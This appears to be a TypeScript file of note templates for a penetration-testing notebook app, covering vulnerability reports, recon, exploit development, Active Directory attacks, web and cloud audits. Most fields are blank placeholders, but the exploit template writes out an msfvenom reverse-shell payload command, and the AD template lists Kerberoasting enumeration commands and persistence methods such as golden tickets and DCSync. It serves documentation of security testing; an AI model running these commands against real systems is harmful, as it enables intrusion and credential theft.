export interface NoteTemplate {
  id: string;
  name: string;
  category: string;
  icon: string;
  content: string;
}

export const NOTE_TEMPLATES: NoteTemplate[] = [
  {
    id: 'vuln-report',
    name: 'Vulnerability Report',
    category: 'Methodology/Reporting',
    icon: '🐛',
    content: `# Vulnerability: [TITLE]

## Summary
Brief description of the vulnerability.

## Severity
- **CVSS Score:** X.X
- **Risk Level:** Critical / High / Medium / Low

## Affected Component
- **URL/Endpoint:** 
- **Parameter:** 
- **Version:** 

## Steps to Reproduce
1. Step one
2. Step two
3. Step three

## Proof of Concept
\`\`\`http
GET /vulnerable-endpoint?param=payload HTTP/1.1
Host: target.com
\`\`\`

**Response:**
\`\`\`
[Response content]
\`\`\`

## Impact
Describe the business/security impact.

## Remediation
Recommended fixes:
- [ ] Fix 1
- [ ] Fix 2

## References
- [Link](url)
`
  },
  {
    id: 'recon-checklist',
    name: 'Recon Checklist',
    category: 'Web/Recon',
    icon: '🔍',
    content: `# Recon: [TARGET]

## Scope
- [ ] Confirm scope boundaries
- [ ] Document allowed IPs/domains

## Passive Recon
- [ ] WHOIS lookup
- [ ] DNS records (A, AAAA, MX, TXT, NS)
- [ ] Certificate Transparency logs
- [ ] Wayback Machine
- [ ] Google dorks
- [ ] GitHub/GitLab search
- [ ] Shodan/Censys

### Subdomains Found
| Subdomain | IP | Status | Notes |
|-----------|-----|--------|-------|
| | | | |

## Active Recon
- [ ] Port scan (top 1000)
- [ ] Full port scan
- [ ] Service detection
- [ ] Web technology fingerprint

### Open Ports
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| | | | |

## Web Enumeration
- [ ] Directory brute-force
- [ ] Virtual host discovery
- [ ] API endpoint discovery
- [ ] JavaScript analysis

### Interesting Endpoints
\`\`\`
/api/
/admin/
\`\`\`

## Notes
Additional observations...
`
  },
  {
    id: 'exploit-notes',
    name: 'Exploit Development',
    category: 'Methodology/General',
    icon: '💥',
    content: `# Exploit: [NAME]

## Target
- **Application:** 
- **Version:** 
- **Platform:** 

## Vulnerability Type
- [ ] Buffer Overflow
- [ ] Format String
- [ ] Use After Free
- [ ] Other: ___

## Analysis

### Crash Analysis
\`\`\`
[Crash dump or error]
\`\`\`

### Registers
\`\`\`
EIP: 0x41414141
ESP: 0x...
EBP: 0x...
\`\`\`

### Offset Finding
\`\`\`python
# Pattern create
pattern_create -l 1000
# Pattern offset
pattern_offset -q 0x41414141
\`\`\`

**Offset:** XXX bytes

## Exploitation

### Bad Characters
\`\`\`
\\x00\\x0a\\x0d
\`\`\`

### Gadgets
\`\`\`
JMP ESP: 0x...
POP POP RET: 0x...
\`\`\`

### Shellcode
\`\`\`python
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -b "\\x00\\x0a\\x0d" -f python
\`\`\`

### Final Exploit
\`\`\`python
#!/usr/bin/python3
# Exploit code here
\`\`\`

## References
- 
`
  },
  {
    id: 'ad-attack',
    name: 'AD Attack Path',
    category: 'Active Directory/Enumeration',
    icon: '🏰',
    content: `# AD Attack: [DOMAIN]

## Initial Access
- **Method:** 
- **User:** 
- **Host:** 

## Enumeration

### Domain Info
\`\`\`powershell
Get-Domain
Get-DomainController
\`\`\`

### Users of Interest
| Username | Description | Groups | Notes |
|----------|-------------|--------|-------|
| | | | |

### High-Value Targets
- [ ] Domain Admins
- [ ] Enterprise Admins
- [ ] Backup Operators
- [ ] Schema Admins

### Kerberoastable Accounts
\`\`\`powershell
Get-DomainUser -SPN
\`\`\`

### AS-REP Roastable
\`\`\`powershell
Get-DomainUser -PreauthNotRequired
\`\`\`

## Attack Path

### Step 1: [Action]
\`\`\`
Command or description
\`\`\`

### Step 2: [Action]
\`\`\`
Command or description
\`\`\`

## Credentials Obtained
| Username | Password/Hash | Source |
|----------|---------------|--------|
| | | |

## BloodHound Analysis
Key findings from BloodHound...

## Persistence
- [ ] Golden ticket
- [ ] Silver ticket
- [ ] Skeleton key
- [ ] DCSync

## Cleanup
- [ ] Remove tools
- [ ] Clear logs
- [ ] Document changes
`
  },
  {
    id: 'web-vuln',
    name: 'Web Vulnerability',
    category: 'Web/XSS',
    icon: '🕸️',
    content: `# [VULN TYPE]: [TARGET]

## Discovery
- **URL:** 
- **Parameter:** 
- **Method:** GET / POST
- **Auth Required:** Yes / No

## Testing

### Initial Payload
\`\`\`
[Initial test payload]
\`\`\`

### Working Payload
\`\`\`
[Final working payload]
\`\`\`

### Bypass Techniques Used
- [ ] Encoding
- [ ] Case variation
- [ ] Alternative syntax
- [ ] Other: ___

## HTTP Request
\`\`\`http
POST /endpoint HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=payload
\`\`\`

## HTTP Response
\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html

[Response body]
\`\`\`

## Impact
What can an attacker do with this?

## Screenshots
[Attach or link to screenshots]

## Automation
\`\`\`bash
# Command to automate exploitation
\`\`\`
`
  },
  {
    id: 'cloud-audit',
    name: 'Cloud Audit',
    category: 'Cloud/AWS',
    icon: '☁️',
    content: `# Cloud Audit: [ACCOUNT/PROJECT]

## Scope
- **Provider:** AWS / Azure / GCP
- **Account ID:** 
- **Region(s):** 

## Identity & Access

### IAM Analysis
- [ ] Overly permissive policies
- [ ] Unused credentials
- [ ] Root account usage
- [ ] MFA enforcement

### Risky Permissions
| Principal | Permission | Resource | Risk |
|-----------|------------|----------|------|
| | | | |

## Compute

### EC2/VMs
| Instance | Public IP | Security Groups | Notes |
|----------|-----------|-----------------|-------|
| | | | |

### Containers
- [ ] Public ECR/ACR repositories
- [ ] Privileged containers
- [ ] Host network access

## Storage

### S3/Blob Analysis
| Bucket | Public Access | Encryption | ACL |
|--------|---------------|------------|-----|
| | | | |

### Sensitive Files Found
- 

## Networking
- [ ] Public subnets
- [ ] Overly permissive security groups
- [ ] VPC peering
- [ ] Transit gateway

## Secrets & Keys
- [ ] Hardcoded credentials
- [ ] Secrets in environment variables
- [ ] Key rotation

## Findings Summary
| Finding | Severity | Status |
|---------|----------|--------|
| | | |

## Remediation
Prioritized recommendations...
`
  },
  {
    id: 'meeting-notes',
    name: 'Meeting Notes',
    category: 'Methodology/General',
    icon: '📝',
    content: `# Meeting: [TITLE]

**Date:** ${new Date().toLocaleDateString()}
**Attendees:** 
**Duration:** 

## Agenda
1. 
2. 
3. 

## Discussion

### Topic 1
Notes...

### Topic 2
Notes...

## Action Items
- [ ] **[Person]:** Task description - Due: DATE
- [ ] **[Person]:** Task description - Due: DATE

## Decisions Made
- Decision 1
- Decision 2

## Next Steps
- 

## Next Meeting
**Date:** 
**Agenda:** 
`
  },
  {
    id: 'blank',
    name: 'Blank Note',
    category: 'Methodology/General',
    icon: '📄',
    content: `# Title

Start writing here...
`
  }
];

export const getTemplateById = (id: string): NoteTemplate | undefined => {
  return NOTE_TEMPLATES.find(t => t.id === id);
};

export const getTemplatesByCategory = (category: string): NoteTemplate[] => {
  return NOTE_TEMPLATES.filter(t => t.category.startsWith(category));
};
